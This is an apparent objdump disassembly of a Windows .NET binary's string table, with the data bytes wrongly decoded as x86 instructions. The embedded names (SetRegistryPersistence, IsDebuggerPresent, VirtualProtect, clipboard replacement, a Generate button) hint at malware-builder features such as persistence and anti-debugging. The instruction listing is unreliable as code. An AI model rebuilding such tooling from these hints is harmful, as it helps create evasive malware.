  40496f:	64 77 54             	fs ja  0x4049c6
  404972:	68 72 65 61 64       	push   $0x64616572
  404977:	49                   	dec    %ecx
  404978:	64 00 63 6f          	add    %ah,%fs:0x6f(%ebx)
  40497c:	6e                   	outsb  %ds:(%esi),(%dx)
  40497d:	6e                   	outsb  %ds:(%esi),(%dx)
  40497e:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  404983:	6e                   	outsb  %ds:(%esi),(%dx)
  404984:	49                   	dec    %ecx
  404985:	64 00 64 77 50       	add    %ah,%fs:0x50(%edi,%esi,2)
  40498a:	72 6f                	jb     0x4049fb
  40498c:	63 65 73             	arpl   %esp,0x73(%ebp)
  40498f:	73 49                	jae    0x4049da
  404991:	64 00 68 54          	add    %ch,%fs:0x54(%eax)
  404995:	68 72 65 61 64       	push   $0x64616572
  40499a:	00 5f 63             	add    %bl,0x63(%edi)
  40499d:	6f                   	outsl  %ds:(%esi),(%dx)
  40499e:	6e                   	outsb  %ds:(%esi),(%dx)
  40499f:	74 65                	je     0x404a06
  4049a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4049a2:	74 4c                	je     0x4049f0
  4049a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4049a5:	61                   	popa
  4049a6:	64 65 64 00 67 65    	fs gs add %ah,%fs:0x65(%edi)
  4049ac:	74 5f                	je     0x404a0d
  4049ae:	49                   	dec    %ecx
  4049af:	73 41                	jae    0x4049f2
  4049b1:	74 74                	je     0x404a27
  4049b3:	61                   	popa
  4049b4:	63 68 65             	arpl   %ebp,0x65(%eax)
  4049b7:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  4049bb:	74 5f                	je     0x404a1c
  4049bd:	49                   	dec    %ecx
  4049be:	73 43                	jae    0x404a03
  4049c0:	68 65 63 6b 65       	push   $0x656b6365
  4049c5:	64 00 73 65          	add    %dh,%fs:0x65(%ebx)
  4049c9:	74 5f                	je     0x404a2a
  4049cb:	49                   	dec    %ecx
  4049cc:	73 45                	jae    0x404a13
  4049ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4049cf:	61                   	popa
  4049d0:	62 6c 65 64          	bound  %ebp,0x64(%ebp,%eiz,2)
  4049d4:	00 6c 70 4f          	add    %ch,0x4f(%eax,%esi,2)
  4049d8:	76 65                	jbe    0x404a3f
  4049da:	72 6c                	jb     0x404a48
  4049dc:	61                   	popa
  4049dd:	70 70                	jo     0x404a4f
  4049df:	65 64 00 73 61       	gs add %dh,%fs:0x61(%ebx)
  4049e4:	6d                   	insl   (%dx),%es:(%edi)
  4049e5:	44                   	inc    %esp
  4049e6:	65 73 69             	gs jae 0x404a52
  4049e9:	72 65                	jb     0x404a50
  4049eb:	64 00 61 6c          	add    %ah,%fs:0x6c(%ecx)
  4049ef:	72 65                	jb     0x404a56
  4049f1:	61                   	popa
  4049f2:	64 79 45             	fs jns 0x404a3a
  4049f5:	78 65                	js     0x404a5c
  4049f7:	63 75 74             	arpl   %esi,0x74(%ebp)
  4049fa:	65 64 00 6c 70 52    	gs add %ch,%fs:0x52(%eax,%esi,2)
  404a00:	65 73 65             	gs jae 0x404a68
  404a03:	72 76                	jb     0x404a7b
  404a05:	65 64 00 53 79       	gs add %dl,%fs:0x79(%ebx)
  404a0a:	6e                   	outsb  %ds:(%esi),(%dx)
  404a0b:	63 68 72             	arpl   %ebp,0x72(%eax)
  404a0e:	6f                   	outsl  %ds:(%esi),(%dx)
  404a0f:	6e                   	outsb  %ds:(%esi),(%dx)
  404a10:	69 7a 65 64 00 4e 65 	imul   $0x654e0064,0x65(%edx),%edi
  404a17:	77 47                	ja     0x404a60
  404a19:	75 69                	jne    0x404a84
  404a1b:	64 00 55 72          	add    %dl,%fs:0x72(%ebp)
  404a1f:	69 4b 69 6e 64 00 6d 	imul   $0x6d00646e,0x69(%ebx),%ecx
  404a26:	65 74 68             	gs je  0x404a91
  404a29:	6f                   	outsl  %ds:(%esi),(%dx)
  404a2a:	64 00 43 6c          	add    %al,%fs:0x6c(%ebx)
  404a2e:	69 70 62 6f 61 72 64 	imul   $0x6472616f,0x62(%eax),%esi
  404a35:	00 52 65             	add    %dl,0x65(%edx)
  404a38:	70 6c                	jo     0x404aa6
  404a3a:	61                   	popa
  404a3b:	63 65 00             	arpl   %esp,0x0(%ebp)
  404a3e:	49                   	dec    %ecx
  404a3f:	73 4e                	jae    0x404a8f
  404a41:	75 6c                	jne    0x404aaf
  404a43:	6c                   	insb   (%dx),%es:(%edi)
  404a44:	4f                   	dec    %edi
  404a45:	72 57                	jb     0x404a9e
  404a47:	68 69 74 65 53       	push   $0x53657469
  404a4c:	70 61                	jo     0x404aaf
  404a4e:	63 65 00             	arpl   %esp,0x0(%ebp)
  404a51:	43                   	inc    %ebx
  404a52:	72 65                	jb     0x404ab9
  404a54:	61                   	popa
  404a55:	74 65                	je     0x404abc
  404a57:	49                   	dec    %ecx
  404a58:	6e                   	outsb  %ds:(%esi),(%dx)
  404a59:	73 74                	jae    0x404acf
  404a5b:	61                   	popa
  404a5c:	6e                   	outsb  %ds:(%esi),(%dx)
  404a5d:	63 65 00             	arpl   %esp,0x0(%ebp)
  404a60:	64 65 66 61          	fs gs popaw
  404a64:	75 6c                	jne    0x404ad2
  404a66:	74 49                	je     0x404ab1
  404a68:	6e                   	outsb  %ds:(%esi),(%dx)
  404a69:	73 74                	jae    0x404adf
  404a6b:	61                   	popa
  404a6c:	6e                   	outsb  %ds:(%esi),(%dx)
  404a6d:	63 65 00             	arpl   %esp,0x0(%ebp)
  404a70:	53                   	push   %ebx
  404a71:	65 74 52             	gs je  0x404ac6
  404a74:	65 67 69 73 74 72 79 	imul   $0x65507972,%gs:0x74(%bp,%di),%esi
  404a7b:	50 65 
  404a7d:	72 73                	jb     0x404af2
  404a7f:	69 73 74 65 6e 63 65 	imul   $0x65636e65,0x74(%ebx),%esi
  404a86:	00 64 77 53          	add    %ah,0x53(%edi,%esi,2)
  404a8a:	68 61 72 65 4d       	push   $0x4d657261
  404a8f:	6f                   	outsl  %ds:(%esi),(%dx)
  404a90:	64 65 00 67 65       	fs add %ah,%gs:0x65(%edi)
  404a95:	74 5f                	je     0x404af6
  404a97:	55                   	push   %ebp
  404a98:	6e                   	outsb  %ds:(%esi),(%dx)
  404a99:	69 63 6f 64 65 00 4d 	imul   $0x4d006564,0x6f(%ebx),%esp
  404aa0:	65 73 73             	gs jae 0x404b16
  404aa3:	61                   	popa
  404aa4:	67 65 42             	addr16 gs inc %edx
  404aa7:	6f                   	outsl  %ds:(%esi),(%dx)
  404aa8:	78 49                	js     0x404af3
  404aaa:	6d                   	insl   (%dx),%es:(%edi)
  404aab:	61                   	popa
  404aac:	67 65 00 67 65       	add    %ah,%gs:0x65(%bx)
  404ab1:	74 5f                	je     0x404b12
  404ab3:	4d                   	dec    %ebp
  404ab4:	65 73 73             	gs jae 0x404b2a
  404ab7:	61                   	popa
  404ab8:	67 65 00 45 6e       	add    %al,%gs:0x6e(%di)
  404abd:	64 49                	fs dec %ecx
  404abf:	6e                   	outsb  %ds:(%esi),(%dx)
  404ac0:	76 6f                	jbe    0x404b31
  404ac2:	6b 65 00 42          	imul   $0x42,0x0(%ebp),%esp
  404ac6:	65 67 69 6e 49 6e 76 	imul   $0x6b6f766e,%gs:0x49(%bp),%ebp
  404acd:	6f 6b 
  404acf:	65 00 49 45          	add    %cl,%gs:0x45(%ecx)
  404ad3:	6e                   	outsb  %ds:(%esi),(%dx)
  404ad4:	75 6d                	jne    0x404b43
  404ad6:	65 72 61             	gs jb  0x404b3a
  404ad9:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  404add:	49                   	dec    %ecx
  404ade:	44                   	inc    %esp
  404adf:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  404ae6:	6c                   	insb   (%dx),%es:(%edi)
  404ae7:	65 00 41 6c          	add    %al,%gs:0x6c(%ecx)
  404aeb:	65 72 74             	gs jb  0x404b62
  404aee:	61                   	popa
  404aef:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  404af3:	47                   	inc    %edi
  404af4:	65 74 4d             	gs je  0x404b44
  404af7:	6f                   	outsl  %ds:(%esi),(%dx)
  404af8:	64 75 6c             	fs jne 0x404b67
  404afb:	65 48                	gs dec %eax
  404afd:	61                   	popa
  404afe:	6e                   	outsb  %ds:(%esi),(%dx)
  404aff:	64 6c                	fs insb (%dx),%es:(%edi)
  404b01:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  404b05:	6e                   	outsb  %ds:(%esi),(%dx)
  404b06:	74 69                	je     0x404b71
  404b08:	6d                   	insl   (%dx),%es:(%edi)
  404b09:	65 54                	gs push %esp
  404b0b:	79 70                	jns    0x404b7d
  404b0d:	65 48                	gs dec %eax
  404b0f:	61                   	popa
  404b10:	6e                   	outsb  %ds:(%esi),(%dx)
  404b11:	64 6c                	fs insb (%dx),%es:(%edi)
  404b13:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  404b17:	74 54                	je     0x404b6d
  404b19:	79 70                	jns    0x404b8b
  404b1b:	65 46                	gs inc %esi
  404b1d:	72 6f                	jb     0x404b8e
  404b1f:	6d                   	insl   (%dx),%es:(%edi)
  404b20:	48                   	dec    %eax
  404b21:	61                   	popa
  404b22:	6e                   	outsb  %ds:(%esi),(%dx)
  404b23:	64 6c                	fs insb (%dx),%es:(%edi)
  404b25:	65 00 4b 65          	add    %cl,%gs:0x65(%ebx)
  404b29:	79 48                	jns    0x404b73
  404b2b:	61                   	popa
  404b2c:	6e                   	outsb  %ds:(%esi),(%dx)
  404b2d:	64 6c                	fs insb (%dx),%es:(%edi)
  404b2f:	65 00 68 54          	add    %ch,%gs:0x54(%eax)
  404b33:	65 6d                	gs insl (%dx),%es:(%edi)
  404b35:	70 6c                	jo     0x404ba3
  404b37:	61                   	popa
  404b38:	74 65                	je     0x404b9f
  404b3a:	46                   	inc    %esi
  404b3b:	69 6c 65 00 68 46 69 	imul   $0x6c694668,0x0(%ebp,%eiz,2),%ebp
  404b42:	6c 
  404b43:	65 00 6c 70 54       	add    %ch,%gs:0x54(%eax,%esi,2)
  404b48:	69 74 6c 65 00 68 4d 	imul   $0x6f4d6800,0x65(%esp,%ebp,2),%esi
  404b4f:	6f 
  404b50:	64 75 6c             	fs jne 0x404bbf
  404b53:	65 00 70 72          	add    %dh,%gs:0x72(%eax)
  404b57:	6f                   	outsl  %ds:(%esi),(%dx)
  404b58:	63 4e 61             	arpl   %ecx,0x61(%esi)
  404b5b:	6d                   	insl   (%dx),%es:(%edi)
  404b5c:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  404b60:	74 5f                	je     0x404bc1
  404b62:	46                   	inc    %esi
  404b63:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  404b6a:	00 
  404b6b:	6c                   	insb   (%dx),%es:(%edi)
  404b6c:	70 45                	jo     0x404bb3
  404b6e:	78 69                	js     0x404bd9
  404b70:	73 74                	jae    0x404be6
  404b72:	69 6e 67 46 69 6c 65 	imul   $0x656c6946,0x67(%esi),%ebp
  404b79:	4e                   	dec    %esi
  404b7a:	61                   	popa
  404b7b:	6d                   	insl   (%dx),%es:(%edi)
  404b7c:	65 00 6c 70 46       	add    %ch,%gs:0x46(%eax,%esi,2)
  404b81:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  404b88:	00 
  404b89:	6c                   	insb   (%dx),%es:(%edi)
  404b8a:	70 4e                	jo     0x404bda
  404b8c:	65 77 46             	gs ja  0x404bd5
  404b8f:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  404b96:	00 
  404b97:	6d                   	insl   (%dx),%es:(%edi)
  404b98:	6f                   	outsl  %ds:(%esi),(%dx)
  404b99:	64 75 6c             	fs jne 0x404c08
  404b9c:	65 4e                	gs dec %esi
  404b9e:	61                   	popa
  404b9f:	6d                   	insl   (%dx),%es:(%edi)
  404ba0:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
  404ba4:	6c                   	insb   (%dx),%es:(%edi)
  404ba5:	75 65                	jne    0x404c0c
  404ba7:	4e                   	dec    %esi
  404ba8:	61                   	popa
  404ba9:	6d                   	insl   (%dx),%es:(%edi)
  404baa:	65 00 6c 70 50       	add    %ch,%gs:0x50(%eax,%esi,2)
  404baf:	61                   	popa
  404bb0:	74 68                	je     0x404c1a
  404bb2:	4e                   	dec    %esi
  404bb3:	61                   	popa
  404bb4:	6d                   	insl   (%dx),%es:(%edi)
  404bb5:	65 00 6c 70 41       	add    %ch,%gs:0x41(%eax,%esi,2)
  404bba:	70 70                	jo     0x404c2c
  404bbc:	6c                   	insb   (%dx),%es:(%edi)
  404bbd:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  404bc4:	4e                   	dec    %esi
  404bc5:	61                   	popa
  404bc6:	6d                   	insl   (%dx),%es:(%edi)
  404bc7:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  404bcb:	74 50                	je     0x404c1d
  404bcd:	72 6f                	jb     0x404c3e
  404bcf:	63 65 73             	arpl   %esp,0x73(%ebp)
  404bd2:	73 65                	jae    0x404c39
  404bd4:	73 42                	jae    0x404c18
  404bd6:	79 4e                	jns    0x404c26
  404bd8:	61                   	popa
  404bd9:	6d                   	insl   (%dx),%es:(%edi)
  404bda:	65 00 6c 70 43       	add    %ch,%gs:0x43(%eax,%esi,2)
  404bdf:	6f                   	outsl  %ds:(%esi),(%dx)
  404be0:	6d                   	insl   (%dx),%es:(%edi)
  404be1:	6d                   	insl   (%dx),%es:(%edi)
  404be2:	61                   	popa
  404be3:	6e                   	outsb  %ds:(%esi),(%dx)
  404be4:	64 4c                	fs dec %esp
  404be6:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  404bed:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  404bf0:	65 00 43 62          	add    %al,%gs:0x62(%ebx)
  404bf4:	50                   	push   %eax
  404bf5:	61                   	popa
  404bf6:	63 6b 61             	arpl   %ebp,0x61(%ebx)
  404bf9:	67 65 54             	addr16 gs push %esp
  404bfc:	79 70                	jns    0x404c6e
  404bfe:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
  404c02:	6c                   	insb   (%dx),%es:(%edi)
  404c03:	75 65                	jne    0x404c6a
  404c05:	54                   	push   %esp
  404c06:	79 70                	jns    0x404c78
  404c08:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  404c0c:	74 54                	je     0x404c62
  404c0e:	79 70                	jns    0x404c80
  404c10:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  404c14:	73 74                	jae    0x404c8a
  404c16:	65 6d                	gs insl (%dx),%es:(%edi)
  404c18:	2e 43                	cs inc %ebx
  404c1a:	6f                   	outsl  %ds:(%esi),(%dx)
  404c1b:	72 65                	jb     0x404c82
  404c1d:	00 50 72             	add    %dl,0x72(%eax)
  404c20:	65 73 65             	gs jae 0x404c88
  404c23:	6e                   	outsb  %ds:(%esi),(%dx)
  404c24:	74 61                	je     0x404c87
  404c26:	74 69                	je     0x404c91
  404c28:	6f                   	outsl  %ds:(%esi),(%dx)
  404c29:	6e                   	outsb  %ds:(%esi),(%dx)
  404c2a:	43                   	inc    %ebx
  404c2b:	6f                   	outsl  %ds:(%esi),(%dx)
  404c2c:	72 65                	jb     0x404c93
  404c2e:	00 67 65             	add    %ah,0x65(%edi)
  404c31:	74 5f                	je     0x404c92
  404c33:	43                   	inc    %ebx
  404c34:	75 6c                	jne    0x404ca2
  404c36:	74 75                	je     0x404cad
  404c38:	72 65                	jb     0x404c9f
  404c3a:	00 73 65             	add    %dh,0x65(%ebx)
  404c3d:	74 5f                	je     0x404c9e
  404c3f:	43                   	inc    %ebx
  404c40:	75 6c                	jne    0x404cae
  404c42:	74 75                	je     0x404cb9
  404c44:	72 65                	jb     0x404cab
  404c46:	00 72 65             	add    %dh,0x65(%edx)
  404c49:	73 6f                	jae    0x404cba
  404c4b:	75 72                	jne    0x404cbf
  404c4d:	63 65 43             	arpl   %esp,0x43(%ebp)
  404c50:	75 6c                	jne    0x404cbe
  404c52:	74 75                	je     0x404cc9
  404c54:	72 65                	jb     0x404cbb
  404c56:	00 42 75             	add    %al,0x75(%edx)
  404c59:	74 74                	je     0x404ccf
  404c5b:	6f                   	outsl  %ds:(%esi),(%dx)
  404c5c:	6e                   	outsb  %ds:(%esi),(%dx)
  404c5d:	42                   	inc    %edx
  404c5e:	61                   	popa
  404c5f:	73 65                	jae    0x404cc6
  404c61:	00 41 70             	add    %al,0x70(%ecx)
  404c64:	70 6c                	jo     0x404cd2
  404c66:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  404c6d:	53                   	push   %ebx
  404c6e:	65 74 74             	gs je  0x404ce5
  404c71:	69 6e 67 73 42 61 73 	imul   $0x73614273,0x67(%esi),%ebp
  404c78:	65 00 44 69 73       	add    %al,%gs:0x73(%ecx,%ebp,2)
  404c7d:	70 6f                	jo     0x404cee
  404c7f:	73 65                	jae    0x404ce6
  404c81:	00 43 72             	add    %al,0x72(%ebx)
  404c84:	65 61                	gs popa
  404c86:	74 65                	je     0x404ced
  404c88:	00 43 6c             	add    %al,0x6c(%ebx)
  404c8b:	6f                   	outsl  %ds:(%esi),(%dx)
  404c8c:	73 65                	jae    0x404cf3
  404c8e:	48                   	dec    %eax
  404c8f:	61                   	popa
  404c90:	6e                   	outsb  %ds:(%esi),(%dx)
  404c91:	64 6c                	fs insb (%dx),%es:(%edi)
  404c93:	65 44                	gs inc %esp
  404c95:	65 6c                	gs insb (%dx),%es:(%edi)
  404c97:	65 67 61             	gs addr16 popa
  404c9a:	74 65                	je     0x404d01
  404c9c:	00 43 72             	add    %al,0x72(%ebx)
  404c9f:	65 61                	gs popa
  404ca1:	74 65                	je     0x404d08
  404ca3:	46                   	inc    %esi
  404ca4:	69 6c 65 44 65 6c 65 	imul   $0x67656c65,0x44(%ebp,%eiz,2),%ebp
  404cab:	67 
  404cac:	61                   	popa
  404cad:	74 65                	je     0x404d14
  404caf:	00 57 72             	add    %dl,0x72(%edi)
  404cb2:	69 74 65 46 69 6c 65 	imul   $0x44656c69,0x46(%ebp,%eiz,2),%esi
  404cb9:	44 
  404cba:	65 6c                	gs insb (%dx),%es:(%edi)
  404cbc:	65 67 61             	gs addr16 popa
  404cbf:	74 65                	je     0x404d26
  404cc1:	00 4d 6f             	add    %cl,0x6f(%ebp)
  404cc4:	76 65                	jbe    0x404d2b
  404cc6:	46                   	inc    %esi
  404cc7:	69 6c 65 44 65 6c 65 	imul   $0x67656c65,0x44(%ebp,%eiz,2),%ebp
  404cce:	67 
  404ccf:	61                   	popa
  404cd0:	74 65                	je     0x404d37
  404cd2:	00 4e 74             	add    %cl,0x74(%esi)
  404cd5:	44                   	inc    %esp
  404cd6:	65 6c                	gs insb (%dx),%es:(%edi)
  404cd8:	61                   	popa
  404cd9:	79 45                	jns    0x404d20
  404cdb:	78 65                	js     0x404d42
  404cdd:	63 75 74             	arpl   %esi,0x74(%ebp)
  404ce0:	69 6f 6e 44 65 6c 65 	imul   $0x656c6544,0x6e(%edi),%ebp
  404ce7:	67 61                	addr16 popa
  404ce9:	74 65                	je     0x404d50
  404ceb:	00 53 65             	add    %dl,0x65(%ebx)
  404cee:	74 46                	je     0x404d36
  404cf0:	69 6c 65 41 74 74 72 	imul   $0x69727474,0x41(%ebp,%eiz,2),%ebp
  404cf7:	69 
  404cf8:	62 75 74             	bound  %esi,0x74(%ebp)
  404cfb:	65 73 44             	gs jae 0x404d42
  404cfe:	65 6c                	gs insb (%dx),%es:(%edi)
  404d00:	65 67 61             	gs addr16 popa
  404d03:	74 65                	je     0x404d6a
  404d05:	00 43 72             	add    %al,0x72(%ebx)
  404d08:	65 61                	gs popa
  404d0a:	74 65                	je     0x404d71
  404d0c:	50                   	push   %eax
  404d0d:	72 6f                	jb     0x404d7e
  404d0f:	63 65 73             	arpl   %esp,0x73(%ebp)
  404d12:	73 44                	jae    0x404d58
  404d14:	65 6c                	gs insb (%dx),%es:(%edi)
  404d16:	65 67 61             	gs addr16 popa
  404d19:	74 65                	je     0x404d80
  404d1b:	00 56 69             	add    %dl,0x69(%esi)
  404d1e:	72 74                	jb     0x404d94
  404d20:	75 61                	jne    0x404d83
  404d22:	6c                   	insb   (%dx),%es:(%edi)
  404d23:	50                   	push   %eax
  404d24:	72 6f                	jb     0x404d95
  404d26:	74 65                	je     0x404d8d
  404d28:	63 74 44 65          	arpl   %esi,0x65(%esp,%eax,2)
  404d2c:	6c                   	insb   (%dx),%es:(%edi)
  404d2d:	65 67 61             	gs addr16 popa
  404d30:	74 65                	je     0x404d97
  404d32:	00 49 73             	add    %cl,0x73(%ecx)
  404d35:	44                   	inc    %esp
  404d36:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  404d3a:	67 65 72 50          	addr16 gs jb 0x404d8e
  404d3e:	72 65                	jb     0x404da5
  404d40:	73 65                	jae    0x404da7
  404d42:	6e                   	outsb  %ds:(%esi),(%dx)
  404d43:	74 44                	je     0x404d89
  404d45:	65 6c                	gs insb (%dx),%es:(%edi)
  404d47:	65 67 61             	gs addr16 popa
  404d4a:	74 65                	je     0x404db1
  404d4c:	00 4d 75             	add    %cl,0x75(%ebp)
  404d4f:	6c                   	insb   (%dx),%es:(%edi)
  404d50:	74 69                	je     0x404dbb
  404d52:	63 61 73             	arpl   %esp,0x73(%ecx)
  404d55:	74 44                	je     0x404d9b
  404d57:	65 6c                	gs insb (%dx),%es:(%edi)
  404d59:	65 67 61             	gs addr16 popa
  404d5c:	74 65                	je     0x404dc3
  404d5e:	00 52 65             	add    %dl,0x65(%edx)
  404d61:	67 4f                	addr16 dec %edi
  404d63:	70 65                	jo     0x404dca
  404d65:	6e                   	outsb  %ds:(%esi),(%dx)
  404d66:	4b                   	dec    %ebx
  404d67:	65 79 45             	gs jns 0x404daf
  404d6a:	78 44                	js     0x404db0
  404d6c:	65 6c                	gs insb (%dx),%es:(%edi)
  404d6e:	65 67 61             	gs addr16 popa
  404d71:	74 65                	je     0x404dd8
  404d73:	00 52 65             	add    %dl,0x65(%edx)
  404d76:	67 43                	addr16 inc %ebx
  404d78:	6c                   	insb   (%dx),%es:(%edi)
  404d79:	6f                   	outsl  %ds:(%esi),(%dx)
  404d7a:	73 65                	jae    0x404de1
  404d7c:	4b                   	dec    %ebx
  404d7d:	65 79 44             	gs jns 0x404dc4
  404d80:	65 6c                	gs insb (%dx),%es:(%edi)
  404d82:	65 67 61             	gs addr16 popa
  404d85:	74 65                	je     0x404dec
  404d87:	00 4e 74             	add    %cl,0x74(%esi)
  404d8a:	53                   	push   %ebx
  404d8b:	65 74 56             	gs je  0x404de4
  404d8e:	61                   	popa
  404d8f:	6c                   	insb   (%dx),%es:(%edi)
  404d90:	75 65                	jne    0x404df7
  404d92:	4b                   	dec    %ebx
  404d93:	65 79 44             	gs jns 0x404dda
  404d96:	65 6c                	gs insb (%dx),%es:(%edi)
  404d98:	65 67 61             	gs addr16 popa
  404d9b:	74 65                	je     0x404e02
  404d9d:	00 43 72             	add    %al,0x72(%ebx)
  404da0:	65 61                	gs popa
  404da2:	74 65                	je     0x404e09
  404da4:	44                   	inc    %esp
  404da5:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  404dac:	79 44                	jns    0x404df2
  404dae:	65 6c                	gs insb (%dx),%es:(%edi)
  404db0:	65 67 61             	gs addr16 popa
  404db3:	74 65                	je     0x404e1a
  404db5:	00 42 74             	add    %al,0x74(%edx)
  404db8:	6e                   	outsb  %ds:(%esi),(%dx)
  404db9:	47                   	inc    %edi
  404dba:	65 6e                	outsb  %gs:(%esi),(%dx)
  404dbc:	65 72 61             	gs jb  0x404e20
  404dbf:	74 65                	je     0x404e26
  404dc1:	00 45 64             	add    %al,0x64(%ebp)
  404dc4:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  404dcb:	77 
  404dcc:	73 61                	jae    0x404e2f
  404dce:	62 6c 65 53          	bound  %ebp,0x53(%ebp,%eiz,2)
  404dd2:	74 61                	je     0x404e35
  404dd4:	74 65                	je     0x404e3b
  404dd6:	00 43 61             	add    %al,0x61(%ebx)
  404dd9:	6c                   	insb   (%dx),%es:(%edi)
  404dda:	6c                   	insb   (%dx),%es:(%edi)
  404ddb:	53                   	push   %ebx
  404ddc:	69 74 65 00 6e 4e 75 	imul   $0x6d754e6e,0x0(%ebp,%eiz,2),%esi
  404de3:	6d 
  404de4:	62 65 72             	bound  %esp,0x72(%ebp)
  404de7:	4f                   	dec    %edi
  404de8:	66 42                	inc    %dx
  404dea:	79 74                	jns    0x404e60
  404dec:	65 73 54             	gs jae 0x404e43
  404def:	6f                   	outsl  %ds:(%esi),(%dx)
  404df0:	57                   	push   %edi
  404df1:	72 69                	jb     0x404e5c
  404df3:	74 65                	je     0x404e5a
  404df5:	00 53 54             	add    %dl,0x54(%ebx)
  404df8:	41                   	inc    %ecx
  404df9:	54                   	push   %esp
  404dfa:	68 72 65 61 64       	push   $0x64616572
  404dff:	41                   	inc    %ecx
  404e00:	74 74                	je     0x404e76
  404e02:	72 69                	jb     0x404e6d
  404e04:	62 75 74             	bound  %esi,0x74(%ebp)
  404e07:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  404e0b:	6d                   	insl   (%dx),%es:(%edi)
  404e0c:	70 69                	jo     0x404e77
  404e0e:	6c                   	insb   (%dx),%es:(%edi)
  404e0f:	65 72 47             	gs jb  0x404e59
  404e12:	65 6e                	outsb  %gs:(%esi),(%dx)
  404e14:	65 72 61             	gs jb  0x404e78
  404e17:	74 65                	je     0x404e7e
  404e19:	64 41                	fs inc %ecx
  404e1b:	74 74                	je     0x404e91
  404e1d:	72 69                	jb     0x404e88
  404e1f:	62 75 74             	bound  %esi,0x74(%ebp)
  404e22:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  404e26:	6e                   	outsb  %ds:(%esi),(%dx)
  404e27:	65 72 61             	gs jb  0x404e8b
  404e2a:	74 65                	je     0x404e91
  404e2c:	64 43                	fs inc %ebx
  404e2e:	6f                   	outsl  %ds:(%esi),(%dx)
  404e2f:	64 65 41             	fs gs inc %ecx
  404e32:	74 74                	je     0x404ea8
  404e34:	72 69                	jb     0x404e9f
  404e36:	62 75 74             	bound  %esi,0x74(%ebp)
  404e39:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  404e3e:	75 67                	jne    0x404ea7
  404e40:	67 65 72 4e          	addr16 gs jb 0x404e92
  404e44:	6f                   	outsl  %ds:(%esi),(%dx)
  404e45:	6e                   	outsb  %ds:(%esi),(%dx)
  404e46:	55                   	push   %ebp
  404e47:	73 65                	jae    0x404eae
  404e49:	72 43                	jb     0x404e8e
  404e4b:	6f                   	outsl  %ds:(%esi),(%dx)
  404e4c:	64 65 41             	fs gs inc %ecx
  404e4f:	74 74                	je     0x404ec5
  404e51:	72 69                	jb     0x404ebc
  404e53:	62 75 74             	bound  %esi,0x74(%ebp)
  404e56:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  404e5b:	75 67                	jne    0x404ec4
  404e5d:	67 61                	addr16 popa
  404e5f:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  404e63:	74 74                	je     0x404ed9
  404e65:	72 69                	jb     0x404ed0
  404e67:	62 75 74             	bound  %esi,0x74(%ebp)
  404e6a:	65 00 45 64          	add    %al,%gs:0x64(%ebp)
  404e6e:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  404e75:	77 
  404e76:	73 61                	jae    0x404ed9
  404e78:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  404e7c:	74 74                	je     0x404ef2
  404e7e:	72 69                	jb     0x404ee9
  404e80:	62 75 74             	bound  %esi,0x74(%ebp)
  404e83:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  404e87:	6d                   	insl   (%dx),%es:(%edi)
  404e88:	56                   	push   %esi
  404e89:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  404e90:	74 74                	je     0x404f06
  404e92:	72 69                	jb     0x404efd
  404e94:	62 75 74             	bound  %esi,0x74(%ebp)
  404e97:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  404e9b:	73 65                	jae    0x404f02
  404e9d:	6d                   	insl   (%dx),%es:(%edi)
  404e9e:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  404ea2:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  404ea9:	72 
  404eaa:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  404eb1:	73 73                	jae    0x404f26
  404eb3:	65 6d                	gs insl (%dx),%es:(%edi)
  404eb5:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  404eb9:	72 61                	jb     0x404f1c
  404ebb:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  404ebe:	61                   	popa
  404ebf:	72 6b                	jb     0x404f2c
  404ec1:	41                   	inc    %ecx
  404ec2:	74 74                	je     0x404f38
  404ec4:	72 69                	jb     0x404f2f
  404ec6:	62 75 74             	bound  %esi,0x74(%ebp)
  404ec9:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  404ece:	67 65 74 46          	addr16 gs je 0x404f18
  404ed2:	72 61                	jb     0x404f35
